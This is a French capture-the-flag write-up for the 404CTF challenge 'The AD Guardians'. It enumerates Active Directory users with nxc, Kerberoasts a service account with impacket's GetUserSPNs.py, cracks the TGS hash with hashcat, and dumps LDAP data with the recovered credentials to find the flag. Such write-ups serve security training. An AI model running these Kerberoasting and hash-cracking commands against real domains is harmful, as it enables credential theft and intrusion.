# The AD Guardians
``Facile``

``HF47``

>Dans les profondeurs du royaume Active Directory, une ancienne prophétie parle d'un artefact caché protégé par des gardiens invisibles. Seuls ceux qui maîtrisent l'art de la négociation pourront espérer découvrir le secret enfoui dans les méandres de l'annuaire.

> Pour ce challenge, vous devez synchroniser votre horloge NTP avec celle du serveur: 1/ sudo apt install ntpdate
2/ sudo ntpdate 51.89.230.137

> Les comptes formation et Administrateur et le groupe CTF_Player ne font pas partie du périmètre du challenge. Il est strictement interdit d'essayer de les compromettre. Les comptes et/ou groupes spécifiques au challenge sont identifiés par CTF ou indiqués dans l'énoncé. En cas de doute, contactez un administrateur.


Comme d'hab, on regarde les utilisateurs.

```
└─$ nxc smb 51.89.230.137 -u 'lion240521_404Player' -p '<password>' --users
SMB         51.89.230.137   445    DC1              [*] Windows Server 2016 Standard 14393 x64 (name:DC1) (domain:ctfcorp.local) (signing:True) (SMBv1:True)
SMB         51.89.230.137   445    DC1              [+] ctfcorp.local\lion240521_404Player:<password> 
SMB         51.89.230.137   445    DC1              -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         51.89.230.137   445    DC1              Administrator                 2025-05-01 20:54:19 5838    Built-in account for administering the computer/domain 
SMB         51.89.230.137   445    DC1              Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         51.89.230.137   445    DC1              krbtgt                        2025-05-01 21:09:01 0       Key Distribution Center Service Account 
SMB         51.89.230.137   445    DC1              DefaultAccount                <never>             0       A user account managed by the system. 
SMB         51.89.230.137   445    DC1              formation                     2025-05-02 04:49:25 0        
SMB         51.89.230.137   445    DC1              hf47                          2025-05-02 14:44:05 0        
SMB         51.89.230.137   445    DC1              sql_service                   2025-05-05 16:33:18 0       SQL Server Service Account 

```

Je tente du kerberoasting en me synchronisant avec le domaine. GetUserSPNs.py dans impacket permet de faire ça facilement.

```
sudo ntpdate 51.89.230.137 && GetUserSPNs.py -request -dc-ip 51.89.230.137 ctfcorp.local/'lion240521_404Player':'<password>'
```
J'obtiens aussi le hash de sql_service. Il s'agit d'un hash kerberos, commençant par
``$krb5tgs$23$``

 Il suffit ensuite d'utiliser un outil comme hashcat pour trouver le mot de passe.

```hashcat -m 13100 sqlhash.txt /usr/share/wordlists/rockyou.txt```

On obtient aussi les hashs d'Administrateur et krbtgt, mais ce sont des mots de passes longs et complexes. Pas la peine de s'y attarder.

Le mdp est ``fantastic``

Il était aussi possible d'importer les données dans [Bloodhound](https://www.thehacker.recipes/ad/recon/bloodhound/) et de regarder les utilisateurs kerberoastables.

On ne peut pas utiliser de service sql. En revanche, l'énoncé parle d'annuaire => LDAP.

J'utilise alors ldapdomaindump avec le compte sql_service pour récupérer les données.

```
ldapdomaindump 51.89.230.137 -u 'ctfcorp.local\sql_service' -p "fantastic" -o output
```

Dans certains fichiers .html comme domain_users.html, on voit un utilisateur qui n'était pas listé dans ``--users``, ainsi que le flag à côté.
```
hidden_flag	hidden_flag	hidden_flag
404CTF{K3rb3r04st1ng_1s_Th3_W4y}
```